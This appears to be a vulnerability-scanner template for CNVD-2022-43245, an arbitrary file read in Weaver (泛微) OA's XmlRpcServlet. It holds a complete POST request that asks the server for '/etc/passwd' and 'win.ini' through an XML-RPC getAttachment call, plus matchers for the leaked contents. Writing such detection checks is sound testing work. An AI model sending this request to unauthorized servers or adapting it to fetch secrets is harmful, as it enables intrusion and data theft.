id: poc-yaml-weaver-oa-xmlrpcservlet-anyfile-read

info:
  name: 泛微OA XmlRpcServlet Arbitrary File Read Vulnerability (CNVD-2022-43245)
  author: ProjectDiscoveryAI
  severity: high
  tags: CNVD-2022-43245,e-office
  description: |
    An arbitrary file read vulnerability in 泛微OA XmlRpcServlet allows attackers to retrieve sensitive files from the server.

http:
  - method: POST
    path:
      - "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet"
    headers:
      Content-Type: application/xml
    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <methodCall>
        <methodName>WorkflowService.getAttachment</methodName>
        <params>
          <param>
            <value>
              <string>{{file}}</string>
            </value>
          </param>
        </params>
      </methodCall>
    payloads:
      file:
        - "c://windows/win.ini"
        - "/etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<base64>"
      - type: word
        part: header
        words:
          - "text/xml"
      - type: regex
        part: body
        regex:
          - "OyBmb3Ig"
          - "Oi9iaW4v"
